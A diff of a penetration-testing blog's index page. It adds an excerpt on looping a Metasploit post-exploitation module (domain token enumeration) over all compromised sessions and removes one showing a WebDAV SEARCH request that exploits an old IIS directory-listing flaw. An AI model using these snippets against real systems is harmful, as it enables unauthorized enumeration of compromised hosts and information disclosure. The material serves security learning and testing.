@@ -219,6 +219,41 @@
     
       <article>
   <header>
+    <h2><a href="http://room362.com/post/2011/2011-11-02-run-post-modules-on-all-sessions/">Run POST Modules On All Sessions</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>02 Nov 2011, 03:06</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Jcran recently blogged about an easy way to run a post module on all sessions: http://blog.pentestify.com/simple-framework-domain-token-scanner msf&gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&gt; irb framework.sessions.each do |session| run_single(&quot;set SESSION #{session.first}&quot;) run_single(&quot;run&quot;) sleep 1 end You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2011/2011-11-02-run-post-modules-on-all-sessions/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
     <h2><a href="http://room362.com/post/2011/2011-10-09-msfconsole-prompt-fiddling/">MSFConsole Prompt Fiddling</a></h2>
 
     <div class="post-meta">
@@ -518,37 +553,6 @@
   <footer>
     <a href="/post/2011/2011-08-30-wim-remes-wimremes-for-isc2-board-of-directors/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
   </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="http://room362.com/post/2011/2011-08-26-iis-search-verb-directory-listing/">IIS Search Verb Directory Listing</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>26 Aug 2011, 18:56</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  This: http://www.securityfocus.com/bid/1756 still works (on vulnerable hosts, this is an old vuln) and is very useful: Send this: SEARCH / HTTP/1.1 Host: target Content-Type: text/xml Content-Length: 133 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;g:searchrequest xmlns:g=&quot;DAV:&quot;&gt; &lt;g:sql&gt; Select &quot;DAV:displayname&quot; from scope() &lt;/g:sql&gt; &lt;/g:searchrequest&gt; And expect something like this back:
-  </p>
-
   
 </article>
 
